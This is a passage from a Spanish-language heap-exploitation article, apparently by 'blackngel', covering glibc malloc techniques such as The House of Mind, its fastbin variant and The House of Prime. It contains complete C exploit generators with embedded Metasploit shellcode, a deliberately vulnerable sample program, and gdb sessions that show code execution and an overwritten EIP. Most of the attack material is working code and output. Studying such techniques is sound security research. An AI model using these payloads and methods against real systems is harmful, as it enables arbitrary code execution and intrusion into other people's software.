+      p->fd = fwd;
+
+Esta claro que ambos punteros son sobreescritos con las direcciones de los
+trozos anterior y posterior a nuestro trozo "p" overfloweado.
+
+Que ocurre si nos estiramos con 16 NOPS?
+
+[-----]
+
+/*
+ * K-sPecial exploit modified by blackngel
+ */
+
+#include <stdio.h>
+
+/* linux_ia32_exec -  CMD=/usr/bin/id Size=72 Encoder=PexFnstenvSub
+http://metasploit.com */
+unsigned char scode[] =
+"\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"
+"\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f"
+"\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10"
+"\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26"
+"\x5e\x9e\x39\xcb\xbf\x04\xea\x42";
+
+int main (void) {
+
+     int i, j;
+
+   for (i = 0; i < 44 / 4; i++)
+          fwrite("\x02\x01\x00\x00", 4, 1, stdout); /* av->max_fast-12 */
+
+   for (i = 0; i < 984 / 4; i++)
+          fwrite("\x48\x96\x04\x08", 4, 1, stdout); /* DTORS_END - 8   */
+
+   for (i = 0; i < 721; i++) {
+          fwrite("\x09\x04\x00\x00", 4, 1, stdout); /* CONSERVAR SIZE  */
+          for (j = 0; j < 1028; j++)
+                  putchar(0x41);                    /* RELLENO  (PAD)  */
+   }
+   fwrite("\x09\x04\x00\x00", 4, 1, stdout);
+
+   for (i = 0; i < (1024 / 4); i++)
+          fwrite("\x14\xa0\x04\x08", 4, 1, stdout);
+
+   fwrite("\xeb\x0c\x90\x90", 4, 1, stdout); /* prev_size -> jump 0x0c */
+
+   fwrite("\x0d\x04\x00\x00", 4, 1, stdout); /* size -> NON_MAIN_ARENA */
+
+   fwrite("\x90\x90\x90\x90\x90\x90\x90\x90" \
+          "\x90\x90\x90\x90\x90\x90\x90\x90", 16, 1, stdout);  /* NOPS */
+
+   fwrite(scode, sizeof(scode), 1, stdout); /* SHELLCODE */
+
+   return 0;
+}
+
+[-----]
+
+blackngel@linux:~$ ./exploit > file
+blackngel@linux:~$ ./heap1 < file
+ptr found at 0x804a008
+good heap allignment found on malloc() 724 (0x81002a0)
+uid=1000(blackngel) gid=1000(blackngel) groups=4(adm),20(dialout),
+24(cdrom),25(floppy),29(audio),30(dip),33(www-data),44(video),
+46(plugdev),104(scanner),108(lpadmin),110(admin),115(netdev),
+117(powerdev),1000(blackngel),1001(compiler)
+blackngel@linux:~$ 
+
+Lo hemos logrado! Hasta este punto, tu podrias pensar que la primera de las
+condiciones para aplicar The House of Mind (un trozo de memoria reservado
+en una direccion superior a 0x08100000) parece imposible desde un punto de
+vista practico.
+
+Pero esto debe ser pensado nuevamente por dos motivos:
+
+  1) Si se puede reservar tanta memoria.
+  2) El propio usuario puede controlar esta cantidad.
+
+Es eso cierto?
+
+Pues si, si volvemos hacia atras en el tiempo. Incluso al mismo fallo de
+seguridad en la funcion is_modified() de CVS, podemos observar la funcion
+correspondiente al comando "entry" de dicho servicio:
+
+[-----]
+
+ static void serve_entry (arg)
+       char *arg;
+ {
+     struct an_entry *p; char *cp;
+
+     [...]
+     cp = arg;
+     [...]
+     p = xmalloc (sizeof (struct an_entry));
+     cp = xmalloc (strlen (arg) + 2); strcpy (cp, arg); p->next = entries;
+     p->entry = cp;
+     entries = p;
+ }
+
+[-----]
+
+Vemos como se van reservando en el heap trozos, siguiendo este orden:
+
+   [an_entry][buffer][an_entry][buffer]...[Wilderness]
+
+Estos trozos no seran liberados hasta que la funcion server_write_entries()
+sea llamada con el comando "noop". Fijate que ademas de controlar el numero
+de trozos reservados, puedes controlar su longitud.
+
+Puedes encontrar esta teoria mucho mejor explicada en el articulo de Phrack
+64 "The art of Exploitation: Come back on a exploit" [10] publicado por
+"vl4d1m1r of Ac1dB1tch3z". 
+
+El antiguo exploit utilizaba la tecnica unlink() para cumplir su proposito.
+Esto era para versiones de glibc en las que esta funcion no esta todavia
+parcheada.
+
+Yo no estoy diciendo que The House of Mind sea aplicable a dicho fallo de
+seguridad, sino mas bien que permite cumplir ciertas condiciones. De todos
+modos seria un ejercicio para el lector mas avanzado.
+
+En resumen, hemos llegado, tras un largo camino, a The House of Mind.
+
+
+
+                  << Si el unico instrumento de que se
+                     dispone es un martillo, todo acaba
+                     pareciendo un clavo. >>
+
+                                        [ Lotfi Zadeh ]
+
+
+
+               --------------------
+---[ 4.1.1 ---[   METODO FASTBIN   ]---
+               --------------------
+
+Como un nuevo avance, demostrare en este articulo una solucion practica
+al "Metodo Fastbin", en The House of Mind, metodo que solo fue expuesto
+de forma teorica en los papers de Phantasmal y K-sPecial y que ademas
+contenian ciertos elementos que fueron erroneamente interpretados.
+
+Tanto Phantasmal como K-sPecial dijeron practicamente lo mismo en sus
+documentos con respecto a este metodo. La idea base era desencadenar el
+siguiente codigo:
+
+[-----]
+
+  if ((unsigned long)(size) <= (unsigned long)(av->max_fast)) {
+   if (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
+	|| __builtin_expect (chunksize (chunk_at_offset (p, size))
+			     >= av->system_mem, 0))
+      {
+	errstr = "free(): invalid next size (fast)";
+	goto errout;
+      }
+
+    set_fastchunks(av);
+    fb = &(av->fastbins[fastbin_index(size)]);
+    if (__builtin_expect (*fb == p, 0))
+      {
+	errstr = "double free or corruption (fasttop)";
+	goto errout;
+      }
+    printf("\nbDebug: p = 0x%x - fb = 0x%x\n", p, fb);
+    p->fd = *fb;
+    *fb = p;
+  }
+
+[-----]
+
+Como este codigo esta situado pasada la primera comprobacion de la
+funcion "_int_free()", la principal ventaja es que no debemos preocuparnos
+de las siguientes. Esto puede parecer que resulta en una tarea mas facil
+que el método anterior, pero en realidad no es asi.
+
+El nucleo de esta tecnica radica en situar en "fb" la dirección de una
+entrada en ".dtors" o "GOT". Gracias a "The House of Prime" (primera casa
+expuesta en el Malloc Maleficarum), sabemos como lograr esto.
+
+Si alteramos el tamaño del trozo liberado y overfloweado y lo establecemos
+a 8, "fastbin_index()" devolvera lo siguiente:
+
+   #define fastbin_index(sz) ((((unsigned int)(sz)) >> 3) - 2)
+
+   (8 >> 3) - 2 = -1
+
+Por lo tanto:
+
+   &(av->fastbins[-1])
+
+Y como en una estructura "arena" (malloc_state) el elemento anterior a
+la matriz fastbins[] es precisamente "av->maxfast", la dirección donde
+se encuentre este valor sera puesto en "fb".
+
+En "*fb = p", lo que se encuentre en esta direccion sera sobreescrito con
+la dirección del trozo liberado "p", que como antes debera contener una
+instrucción "jmp" y saltar a un Shellcode.
+
+Visto esto, si quisieramos utilizar ".dtors", deberiamos hacer que en
+"public_free()", "ar_ptr" apunte a la dirección de ".dtors", de modo que
+ahi se constituya la arena falsa y "av->max_fast" (av + 4) sea igual a
+".dtors + 4" y sea sobreescrita con la direccion de "p".
+
+Pero para lograr esto hay que pasar nuevamente por un camino de espinas,
+corto, pero bastante duro.
+
+   1) El Tamaño del trozo (size) debe ser menor que "av->maxfast":
+
+   if ((unsigned long)(size) <= (unsigned long)(av->max_fast))
+
+   Esto es relativamente lo más facil, ya que hemos dicho que el tamaño
+   sera igual a "8" y "av->max_fast" sera la direccion de un destructor.
+   Debe quedar claro que en este caso no sirve "DTORS_END" ya que este
+   es siempre "\x0\x0\x0\x0" y nunca sera mayor que "size".
+   Parece que lo mas efectivo entonces es hacer uso de la Tabla Global
+   de Offset (GOT).
+
+   Algo mas debe ser tenido en cuenta, decimos que "size" debe ser 8, pero
+   para modificar a nuestro antojo "ar_ptr", como en la anterior tecnica,
+   el bit NON_MAIN_ARENA (tercer bit menos significativo) tiene que estar
+   activado. De modo que, segun creo, "size" deberia ser en realidad:
+
+      8 = 1000b | 100b = 4 | 8 + NON_MAIN_ARENA = 12 = [0x0c]
+
+      Si activamos PREV_INUSE: 1101b = [0x0d] 
+
+
+   2) El tamaño del trozo contiguo (siguiente) al trozo "p" debe ser mayor
+      que "8":
+
+   __builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)
+
+   Esto no implica ninguna dificultad, ¿no?
+
+   3) Ese mismo trozo, a su vez, debe ser menor que "av->system_mem":
+
+   __builtin_expect (chunksize (chunk_at_offset (p, size)) >= av->system_mem, 0)
+
+   Este es quiza el paso mas complicado. Una vez establecido ar_ptr(av)
+   en ".dtors" o la "GOT", el miembro "system_mem" de la estructura
+   "malloc_state" se encuentra 1848 bytes mas alla.
+
+   GOT es consecutivo a DTORS, en programas pequeños la tabla GOT tambien
+   es relativamente pequeña. Por este motivo es normal encontrar en la
+   posicion de av->system_mem una gran cantidad de bytes 0. Veamoslo:
+
+   [-----]
+
+   blackngel@linux:~$ objdump -s -j .dtors ./heap1
+   ...
+   Contents of section .dtors:
+   8049650 ffffffff 00000000
+                    ........        
+   blackngel@mac:~$ gdb -q ./heap1
+   (gdb) break main
+   Breakpoint 1 at 0x8048442
+   (gdb) run < file
+   ...
+   Breakpoint 1, 0x08048442 in main ()
+   (gdb) x/8x 0x08049650
+   0x8049650 <__DTOR_LIST__>: 0xffffffff 0x00000000 0x00000000 0x00000001
+   0x8049660 <_DYNAMIC+4>:    0x00000010 0x0000000c 0x0804830c 0x0000000d
+   (gdb) x/8x 0x08049650 + 1848
+   0x8049d88: 0x00000000   0x00000000   0x00000000   0x00000000
+   0x8049d98: 0x00000000   0x00000000   0x00000000   0x00000000 
+
+   [-----]
+
+   Por lo que esta tecnica parece solo aplicable en programas grandes. A
+   no ser, como dijo Phantasmal, que utilicemos la pila. ¿Como?
+
+   Si establecemos "ar_ptr" en la dirección de EBP en una funcion, entonces
+   "av->max_fast" se correspondera con EIP, que podra ser sobreescrito con
+   la direccion del trozo "p", y ya sabeis como continua.
+
+Y aqui se terminaba la teoria presentada en los dos papers mencionados.
+Pero desgraciadamente hay algo de lo que se olvidaron, al menos es algo
+que me ha sorprendido bastante de K-sPecial.
+
+Aprendimos del ataque anterior que "av->mutex", que es el primer miembro
+de la estructura "arena", debia de ser igual a 0. K-sPecial nos advirtio
+que de no ser asi, "free()" se mantendria en un bucle infinito...
+
+¿Que pasa con DTORS entonces?
+
+.dtors siempre sera 0xffffffff, en otro caso sera una direccion de un
+destructor, pero en ningun caso sera 0.
+
+Puedes encontrar un 0 cuatro bytes mas atras de .dtors, pero sobreescribir
+0xffffffff no tiene ningun efecto.
+
+¿Que pasa con GOT entonces?
+
+No creo que encuentres valores 0x00000000 entre cada item dentro de la
+tabla.
+
+¿Soluciones?
+
+En principio solo habia pensando en una posible solucion:
+
+El objetivo seria utilizar la pila, como ha sido mencionado antes. Pero
+la diferencia es que debemos contar "antes" con un desbordamiento de buffer
+que permita sobreescribir EBP con bytes 0, de modo que tengamos.
+
+   EBP = av->mutex = 0x00000000
+   EIP = av->max_fast = &(p)
+   *p     = "jmp 0x0c"
+   *p + 4 = 0x0c o 0x0d
+   *p + 8 = NOPS + SHELLCODE 
+
+Pero solo hacia falta que la bombilla se iluminase y que la magia surgiese:
+
+
+---------------------
+ SOLUCION DEFINITIVA
+---------------------
+
+Phantasmal y K-sPecial quizas fueron cegados un poco por la idea de usar
+"av->maxfast" para sobreescribir luego esa posicion de memoria con la
+direccion del trozo "p".
+
+Pero dado que controlamos por completo la arena "av", podemos permitirnos
+hacer un nuevo analisis de "fastbin_index()" para un tamaño de "16 bytes":
+
+   (16 >> 3) - 2 = 0
+
+De modo que obtenemos: fb = &(av->fastbins[0]), y si logramos esto podemos
+hacer uso del stack para sobreescribir EIP. ¿Como?
+
+Si nuestro codigo vulnerable esta dentro de una funcion "fvuln()", EBP y
+EIP seran guardados en el stack, ¿y que hay detrás de EBP? Si no hay datos
+de usuario, normalmente encontraremos un "0x00000000". Y ya que utilizamos
+"av->fastbins[0]" y no "av->maxfast", tenemos lo siguiente:
+
+   [ 0xRAND_VAL ]  <->  av + 1848 = av->system_mem
+    ............
+   [     EIP    ]  <->  av->fastbins[0]
+   [     EBP    ]  <->  av->max_fast
+   [ 0x00000000 ]  <->  av->mutex
+
+En "av + 1848" es normal encontrar direcciones o valores aleatorios para
+"av->system_mem" y asi podemos pasar las comprobaciones para alcanzar el
+final del codigo "fastbin".
+
+El campo "size" de "p" debe ser 16 mas los bits NON_MAIN_ARENA y PREV_INUSE
+activados, entonces:
+
+   16 = 10000 | NON_MAIN_ARENA y PREV_INUSE = 101 | SIZE = 10101 = 0x15h
+
+Y podemos controlar el campo "size" del siguiente trozo para que sea mayor
+que "8" y menor que "av->system_mem". Si miras el codigo anterior te daras
+cuenta que este campo se calcula a partir del offset de "p", por tanto,
+este campo estara virtualmente en "p + 0x15", que es un offset de 21 bytes.
+Si escribimos ahi un valor de "0x09" en esa posicion sera perfecto.
+
+Pero este valor estara en medio de nuestro relleno de NOPS y debemos hacer
+un pequeño cambio en el "jmp" para saltar mas lejos, algo asi como 16 bytes
+seran suficientes.
+
+Para la Prueba de Concepto, yo modifique el programa "aircrack-2.41"
+agregando en main() lo siguiente:
+
+[-----]
+
+  int fvuln()
+  {
+   // El mismo codigo vulnerable que en el metodo anterior.
+  }
+
+   int main( int argc, char *argv[] )
+   {
+       int i, n, ret;
+       char *s, buf[128];
+       struct AP_info *ap_cur;
+
+       fvuln();
+   ...
+
+[-----]
+
+El siguiente código explota el programa:
+
+[-----]
+
+/*
+ * FastBin Method - exploit
+ */
+
+#include <stdio.h>
+
+/* linux_ia32_exec -  CMD=/usr/bin/id Size=72 Encoder=PexFnstenvSub 
+http://metasploit.com */
+unsigned char scode[] =
+"\x31\xc9\x83\xe9\xf4\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x5e"
+"\xc9\x6a\x42\x83\xeb\xfc\xe2\xf4\x34\xc2\x32\xdb\x0c\xaf\x02\x6f"
+"\x3d\x40\x8d\x2a\x71\xba\x02\x42\x36\xe6\x08\x2b\x30\x40\x89\x10"
+"\xb6\xc5\x6a\x42\x5e\xe6\x1f\x31\x2c\xe6\x08\x2b\x30\xe6\x03\x26"
+"\x5e\x9e\x39\xcb\xbf\x04\xea\x42";
+
+int main (void) {
+
+        int i, j;
+
+        for (i = 0; i < 1028; i++)                            /* RELLENO */
+                putchar(0x41);
+
+        for (i = 0; i < 518; i++) {
+                fwrite("\x09\x04\x00\x00", 4, 1, stdout);
+                for (j = 0; j < 1028; j++)
+                        putchar(0x41);
+        }
+        fwrite("\x09\x04\x00\x00", 4, 1, stdout);
+
+        for (i = 0; i < (1024 / 4); i++)
+                fwrite("\x34\xf4\xff\xbf", 4, 1, stdout);    /*  EBP - 4 */
+
+        fwrite("\xeb\x16\x90\x90", 4, 1, stdout);            /* JMP 0x16 */
+
+        fwrite("\x15\x00\x00\x00", 4, 1, stdout);  /* 16 + N_M_A + P_INU */
+        
+        fwrite("\x90\x90\x90\x90" \
+               "\x90\x90\x90\x90" \
+               "\x90\x90\x90\x90" \
+               "\x09\x00\x00\x00" \                   /* nextchunk->size */
+               "\x90\x90\x90\x90", 20, 1, stdout);
+                       
+
+        fwrite(scode, sizeof(scode), 1, stdout);      /* LA PIEZA MAGICA */
+
+        return(0);
+}
+
+[-----]
+
+Veamoslo ahora en accion:
+
+[-----]
+
+blackngel@linux:~$ gcc ploit1.c -o ploit
+blackngel@linux:~$ ./ploit > file
+blackngel@linux:~$ gdb -q ./aircrack
+
+(gdb) disass fvuln
+Dump of assembler code for function fvuln:
+.........
+.........
+0x08049298 <fvuln+184>:	call   0x8048d4c <free@plt>
+0x0804929d <fvuln+189>:	movl   $0x8056063,(%esp)
+0x080492a4 <fvuln+196>:	call   0x8048e8c <puts@plt>
+0x080492a9 <fvuln+201>:	mov    %esi,(%esp)
+0x080492ac <fvuln+204>:	call   0x8048d4c <free@plt>
+0x080492b1 <fvuln+209>:	movl   $0x8056075,(%esp)
+0x080492b8 <fvuln+216>:	call   0x8048e8c <puts@plt>
+0x080492bd <fvuln+221>:	add    $0x1c,%esp
+0x080492c0 <fvuln+224>:	xor    %eax,%eax
+0x080492c2 <fvuln+226>:	pop    %ebx
+0x080492c3 <fvuln+227>:	pop    %esi
+0x080492c4 <fvuln+228>:	pop    %edi
+0x080492c5 <fvuln+229>:	pop    %ebp
+0x080492c6 <fvuln+230>:	ret    
+End of assembler dump.
+
+(gdb) break *fvuln+204                           /* Antes del 2do free() */
+Breakpoint 1 at 0x80492ac: file linux/aircrack.c, line 2302.
+
+(gdb) break *fvuln+209                         /* Despues del 2do free() */
+Breakpoint 2 at 0x80492b1: file linux/aircrack.c, line 2303.
+
+(gdb) run < file
+Starting program: /home/blackngel/aircrack < file
+[Thread debugging using libthread_db enabled]
+ptr found at 0x807d008
+good heap allignment found on malloc() 521 (0x8100048)
+
+END fread()                 /* Pruebas cuando free() se congelaba */
+                        
+END first free()            /* Pruebas cuando free() se congelaba */
+[New Thread 0xb7e5b6b0 (LWP 8312)]
+[Switching to Thread 0xb7e5b6b0 (LWP 8312)]
+
+Breakpoint 1, 0x080492ac in fvuln () at linux/aircrack.c:2302
+warning: Source file is more recent than executable.
+2302	        free(ptr2);
+
+/* DUMP del STACK */
+(gdb) x/4x 0xbffff434    // av->max_fast // av->fastbins[0]
+0xbffff434:   0x00000000     0xbffff518     0x0804ce52     0x080483ec
+
+(gdb) x/x 0xbffff434 + 1848  /* av->system_mem */
+0xbffffb6c:	0x3d766d77
+
+(gdb) x/4x 0x08100048-8+20   /* nextchunk->size */
+0x8100054:  0x00000009   0x90909090   0xe983c931   0xd9eed9f4
+(gdb) c
+Continuing.
+
+Breakpoint 2, fvuln () at linux/aircrack.c:2303
+2303	        printf("\nEND second free()\n");
+
+(gdb) x/4x 0xbffff434                 // EIP = &(p)
+0xbffff434:  0x00000000   0xbffff518   0x08100040   0x080483ec
+(gdb) c
+Continuing.
+
+END second free()
+[New process 8312]
+uid=1000(blackngel) gid=1000(blackngel) groups=4(adm),20(dialout),
+24(cdrom),25(floppy),29(audio),30(dip),33(www-data),44(video),
+46(plugdev),104(scanner),108(lpadmin),110(admin),115(netdev),
+117(powerdev),1000(blackngel),1001(compiler)
+
+Program exited normally.
+
+[-----]
+
+La ventaja de este metodo es que no toca en ningun momento el registro EBP,
+y de este modo podemos saltear alguna que otra proteccion contra BoF.
+
+Es de notar tambien que los dos metodos presentados aqui, en The House of
+Mind, todavia son aplicables en las versiones mas recientes de GLIBC, y lo
+he comprobado con la ultima version GLIBC 2.7.
+
+Esta vez hemos llegado, caminando con pies de plomo y tras un largo camino,
+a The House of Mind.
+
+
+
+                 << Solo existen 10 tipos de personas: los que
+                    saben binario y los que no. >>
+
+                                                       [ XXX ]
+
+
+
+               -----------------------
+---[ 4.1.2 ---[   PESADILLA av->top   ]---
+               -----------------------
+
+Una vez que habia finalizado el estudio de The House of Mind, segui bajando
+un poco mas en el codigo en busca de otros posibles vectores de ataque. Se
+me iluminaron los ojos cuando seguidamente me encontre con algo como lo
+siguiente en _int_free():
+
+    /*
+      If the chunk borders the current high end of memory,
+      consolidate into top
+    */
+
+    else {
+      size += nextsize;
+      set_head(p, size | PREV_INUSE);
+      av->top = p;
+      check_chunk(av, p);
+    }
+
+Ya que en un principio controlamos la arena "av", supuestamente podriamos
+situarla en cierto lugar del stack, tal que av->top coincidiera exactamente
+con un EIP guardado.
+
+Llegado ese punto, EIP seria sobreescrito con la direccion de nuestro trozo
+"p" overfloweado. Y por consecuencia una ejecucion de codigo arbitraria
+podria ser desencadenada.
+
+Pero pronto mis intenciones se vieron frustradas. Para lograr la ejecucion
+de este codigo, en un entorno controlado, habria que salvar una condicion
+imposible:
+
+    if (nextchunk != av->top) {
+       ...
+    }
+
+Esto solo ocurre cuando el trozo "p" a liberar resulta ser contiguo al trozo
+mas alto, el temido trozo Wilderness.
+
+En algun momento podrias llegar a pensar que controlas el valor de av->top,
+pero recuerda que una vez que colocas av en el stack, cedes el control a los
+posibles valores aleatorios que alli se encuentren, y el valor actual de EIP
+nunca sera igual a "nextchunk", a no ser que sea posible un desbordamiendo de
+pila clasico, en cuyo caso no se que harias leyendo esto...
+
+Con esto solo quiero demostrar, que para bien o para mal, todos los caminos
+posibles deben ser examinados cuidadosamente.
+
+
+
+                    << Hasta ahora las masas han ido
+                       siempre tras el hechizo. >>
+
+                                      [ K. Jaspers ]
+
+
+
+             ------------------------
+---[ 4.2 ---[   THE HOUSE OF PRIME   ]---
+             ------------------------
+
+Con lo visto hasta ahora, no quisiera extenderme demasiado. The House of
+Prime es, sin duda alguna, una de las tecnicas mas elaboradas, fruto de
+una genialidad.
+
+No obstante, y como bien menciona Phantasmal, es en principio la menos util
+de todas ellas. Aunque teniendo en cuenta que The House of Mind requiere un
+trozo de memoria localizado a partir de 0x08100000, esta no debe ser dejada
+de lado.
+
+Para llevar a cabo esta tecnica se necesitan 2 llamadas a free() sobre 2
+trozos de memoria que esten bajo el control del exploiter y una llamada a
+"malloc()".
+
+El objetivo en este caso, y para que quede claro desde el principio, no es
+sobreescribir ninguna direccion de memoria (aunque si es necesario para la
+culminacion de la tecnica), sino hacer que dicha llamada a "malloc()"
+retorne una dirección de memoria arbitraria. Es decir, que podemos hacer
+que el trozo sea reservado en algun lugar de nuestra eleccion, por ejemplo
+hacer que este en el stack y no en el heap.
+
+Un ultimo requisito es que el usuario pueda controlar lo que es escrito en
+este trozo reservado, de modo que si conseguimos situarlo en la pila,
+relativamente cerca de EIP, este registro pueda ser sobreescrito con un
+valor arbitrario. Y ya sabes como sigue...
+
+Veamos un posible programa vulnerable:
+
+[-----]
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void fvuln(char *str1, char *str2, int age)
+{
+   int edad;
+   char buffer[64];
+   char *ptr = malloc(1024);
+   char *ptr1 = malloc(1024);
+   char *ptr2 = malloc(1024);
+   char *ptr3;
+
+   edad = age;
+   strncpy(buffer, str1, sizeof(buffer)-1);
+
+   printf("\nptr found at [ %p ]", ptr);
+   printf("\nptr1ovf found at [ %p ]", ptr1);
+   printf("\nptr2ovf found at [ %p ]\n", ptr2);
+
+   printf("Escriba una descripcion: ");
+   fread(ptr, 1024 * 5, 1, stdin); 
+
+   free(ptr1);
+   printf("\nEND free(1)\n");
+   free(ptr2);
+   printf("\nEND free(2)\n");
+
+   ptr3 = malloc(1024);
+   printf("\nEND malloc()\n");
+   strncpy(ptr3, str2, 1024-1);
+
+   printf("Te llamas %s y tienes %d", buffer, edad);
+}
+
+int main(int argc, char *argv[])
+{
+   if(argc < 4) {
+      printf("Usage: ./hop nombre apellido edad");
+      exit(0);
+   }
+
+   fvuln(argv[1], argv[2], atoi(argv[3]));
+
+   return 0;
+}
+
+
+[-----]
+
+Para empezar, necesitamos controlar la cabecera de un primer trozo a ser
+liberado, de modo que cuando se produzca el primer "free()". Se desencadene
+el mismo codigo que en el "Metodo Fastbin", pero esta vez el tamaño del
+trozo tiene que ser de "8", y asi obtenemos:
+
+   fastbin_index(8) ((((unsigned int)(8)) >> 3) - 2) = -1
+
+y como ya dijimos:
+
+   fb = &(av->fastbins[-1]) = &av->max_fast;
+
+En la ultima instruccion (*fb = p), av->max_fast sera sobreescrito con la
+direccion de nuestro trozo liberado.
+
+Esto tiene una consecuencia muy evidente, y es que a partir de ese momento
+podemos ejecutar el mismo trozo de codigo en free() siempre que el tamaño
+del trozo a liberar sea menor que el valor de la direccion del trozo "p"
+anteriormente liberado.
+
+Lo normal es: av->max_fast = 0x00000048, y ahora es 0x080YYYYY. Lo que es
+mas de lo que necesitamos.
+
+Para pasar los chequeos del primer free() necesitamos estos tamaños:
+
+Trozo liberado  -> 8 (9h si activas el bit PREV_INUSE).
+Siguiente trozo -> 10h es un buen valor ( 8 < "10h" < av->system_mem )
+
+De modo que el exploit comenzaria con algo asi:
+
+[-----]
+
+int main (void) {
+
+        int i, j;
+
+        for (i = 0; i < 1028; i++)                          /* RELLENO */
+                putchar(0x41);
+
+        fwrite("\x09\x00\x00\x00", 4, 1, stdout); /* free(1) ptr1 size */
+        fwrite("\x41\x41\x41\x41", 4, 1, stdout); /* RELLENO */
+        fwrite("\x10\x00\x00\x00", 4, 1, stdout); /* free(1) ptr2 size */
+
+[-----]
+
+La siguiente mision es sobreescribir el valor de "arena_key" (lee Malloc
+Maleficarum para mas detalles) que se encuentra normalmente por encima de
+"av" (&main_arena).
+
+Como podemos utilizar tamaños de trozos muy grandes, podemos hacer que la
+instruccion &(av->fastbins[x]) apunte muy lejos, al menos lo suficiente
+como para llegar al valor de "arena_key" y sobreescribirlo con la direccion
+del trozo "p".
+
+Si tomamos el ejemplo de Phantasmal, tendriamos que modificar el tamaño del
+segundo trozo a liberar con el siguiente valor:
+
+   1156 bytes / 4 = 289
+   (289 + 2) << 3 = 2328 = 0x918h -> 0x919(PREV_INUSE)
+                           ------
+
+Tambien tendremos que controlar nuevamente el campo "size" del siguiente
+trozo, cuya direccion depende a su vez del tamaño que acabamos de calcular
+hace un momento.
+
+Entonces el exploit continuaria:
+
+[-----]
+
+        for (i = 0; i < 1020; i++)
+                putchar(0x41);
+        fwrite("\x19\x09\x00\x00", 4, 1, stdout); /* free(2) ptr2 size */
+
+        .... /* Mas adelante */
+
+        for (i = 0; i < (2000 / 4); i++)
+                fwrite("\x10\x00\x00\x00", 4, 1, stdout);
+
+[-----]
+
+Al final del segundo free() tendremos: arena_key = p2.
+
+Este valor sera utilizado por la llamada a malloc() estableciendolo como la
+estructura "arena" a utilizar.
+
+    arena_get(ar_ptr, bytes);
+    if(!ar_ptr)
+      return 0;
+    victim = _int_malloc(ar_ptr, bytes);
+
+Veamos nuevamente, para que sea mas intuitivo, el codigo magico de
+"_int_malloc()":
+
+    .....
+
+    if ((unsigned long)(nb) <= (unsigned long)(av->max_fast)) {
+      long int idx = fastbin_index(nb);
+      fb = &(av->fastbins[idx]);
+      if ( (victim = *fb) != 0) {
+        if (fastbin_index (chunksize (victim)) != idx)
+          malloc_printerr (check_action, "malloc(): memory"
+            " corruption (fast)", chunk2mem (victim));
+        *fb = victim->fd;
+        check_remalloced_chunk(av, victim, nb);
+        return chunk2mem(victim);
+      }
+
+    .....
+
+"av" es ahora nuestra arena, que comienza al principio del segundo trozo
+liberado "p2", esta claro entonces que "av->max_fast" sera igual al campo
+"size" de dicho trozo. El primer chequeo nos obliga entonces a que el
+tamaño solicitado por la llamada "malloc()" sea menor que ese valor, como
+dijo Phantasmal, en otro caso puedes probar la tecnica descrita en 4.2.1.
+
+Como nuestro programa vulnerable reserva 1024 bytes, para nosotros sera
+perfecta esta tecnica.
+
+Luego vemos que "fb" es establecido a la direccion de un "fastbin" en "av",
+y en la siguiente instruccion su contenido sera la direccion definitiva de
+"victim". Recuerda que nuestro objetivo es que malloc reserve la cantidad
+de bytes deseados en un lugar de nuestra eleccion.
+
+Te acuerdas tambien de: .... /* Mas adelante */ ?
+
+Pues ahi es donde debemos copiar repetidamente la direccion que deseamos
+en el stack, de modo que cualquier "fastbin" devuelto coloque en "fb"
+nuestra dirección.
+
+Mmmmm, pero espera un momento, la siguiente condicion es la mas importante:
+
+   if (fastbin_index (chunksize (victim)) != idx)
+
+Esto quiere decir que el campo "size" de nuestro trozo falseado, debe ser
+igual al tamaño del bloque solicitado por "malloc()". Este es el ultimo
+requisito en The House of Prime; debemos controlar un valor en la memoria
+y poder situar la direccion de "victim" justo 4 bytes antes para que ese
+valor pase a ser su nuevo tamaño.
+
+En nuestro programa vulnerable se pide como parametros "nombre", "apellido"
+y "edad". Este ultimo valor es un entero que por cierto sera almacenado en
+la pila. Si introducimos en el, el valor real del espacio a reservar, en
+este caso: 1024 -> (1032), solo tenemos que buscarlo para conocer nuestra
+direccion definitiva para "victim".
+
+[-----]
+
+(gdb) run Black Ngel 1032 < file
+ptr found at [ 0x80b2a20 ]
+ptr1ovf found at [ 0x80b2e28 ]
+ptr2ovf found at [ 0x80b3230 ]
+Escriba una descripcion:
+END free(1)
+
+END free(2)
+
+Breakpoint 2, 0x080482d9 in fvuln ()
+(gdb) x/4x $ebp-32
+0xbffff838:     0x00000000      0x00000000      0xbf000000      0x00000408
+
+[-----]
+
+Ahi tenemos nuestro valor, debemos apuntar a "0xbffff840".
+
+        for (i = 0; i < (600 / 4); i++)
+                fwrite("\x40\xf8\xff\xbf", 4, 1, stdout);
+
+Ahora deberiamos tener: ptr3 = malloc(1024) = 0xbffff848, recuerda que se
+devuelve un puntero a la memoria (zona de datos) y no a la cabecera del
+trozo.
+
+Estamos realmente cerca de EBP y EIP, ¿que pasa si nuestro "apellido" esta
+formado por unas cuantas letras "A"?
+
+[-----]
+
+(gdb) run Black `perl -e 'print "A"x64'` 1032 < file
+.....
+ptr found at [ 0x80b2a20 ]
+ptr1ovf found at [ 0x80b2e28 ]
+ptr2ovf found at [ 0x80b3230 ]
+Escriba una descripcion:
+END free(1)
+
+END free(2)
+
+Breakpoint 2, 0x080482d9 in fvuln ()
+(gdb) c
+Continuing.
+
+END malloc()
+
+Breakpoint 3, 0x08048307 in fvuln ()
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb)
+
+[-----]
+
+Bingo! Creo que la parte del Shellcode te corresponde a ti, verdad?
+
+Normalmente las direcciones requieren de reajustes manuales, pero eso es
+algo trivial tomando a GDB de nuestra mano.
+
+En principio esta tecnica solo resulta aplicable hasta la version 2.3.6
+de GLIBC, mas adelante fue añadido en la funcion "free()" un checkeo de
+integridad como este:
+
+[-----]
+
+  /* We know that each chunk is at least MINSIZE bytes in size. */
+  if (__builtin_expect (size < MINSIZE, 0))
+    {
+      errstr = "free(): invalid size";
+      goto errout;
+    }
+
+  check_inuse_chunk(av, p);
+
+[-----]
+
